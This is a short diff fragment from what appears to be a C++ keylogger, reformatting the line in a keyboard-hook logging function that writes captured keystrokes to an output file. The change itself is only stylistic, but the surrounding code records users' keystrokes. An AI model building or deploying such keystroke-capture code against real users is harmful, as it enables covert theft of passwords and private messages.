@@ -39,7 +39,10 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
                                       key_buffer, PWSZ_BUFFER_SIZE, 0);
 
         // If the conversion was successful, write the characters.
-        if (result > 0) out_file << key_buffer;
+        if (result > 0)
+        {
+            out_file << key_buffer;
+        }
     }
 
     // Write all changes to the wofstream.
